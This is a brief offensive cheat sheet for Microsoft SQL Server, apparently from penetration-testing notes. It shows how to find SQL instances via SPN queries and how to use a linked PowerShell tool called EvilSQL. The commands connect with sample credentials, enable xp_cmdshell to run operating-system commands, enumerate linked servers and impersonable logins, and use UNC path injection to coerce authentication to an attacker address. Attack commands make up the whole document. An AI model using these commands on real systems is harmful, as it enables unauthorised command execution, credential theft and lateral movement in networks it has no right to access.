# Microsoft SQL Server
## Find SQL Instance
```
setspn -T example -Q MSSQLSvc/*
```

## Exploition
https://github.com/an3m0ne/Myosotis/blob/main/SQL/EvilSQL.ps1

```powershell
# Connect SQL Instance
Evil-SQLConnect localhost
Evil-SQLConnect SQL01 master an3m0ne P@ssw0rd

# Close SQL Connection
Evil-SQLClose

# Get Current User
Get-CurrentContext

# Run Query
Run-CustomQuery -Query "SELECT @@version"
Run-CustomQuery -Query "SELECT @@version" -Server SQL02

# Enable xp_cmdshell
Enable-XPCmd
Enable-XPCmd -Server SQL02

# Execute OS Command via xp_cmdshell
Invoke-EvilXPCmd -Command whoami
Invoke-EvilXPCmd -Command whoami -Server SQL02

# Find Linked Server
Get-LinkedServers

# Find Impersonated login
Get-ImpresonationLogins

# UNC Path Injection
Invoke-EvilUNCPath -Address 192.168.0.1
Invoke-EvilUNCPath -Address 192.168.0.1 -Server SQL02
```
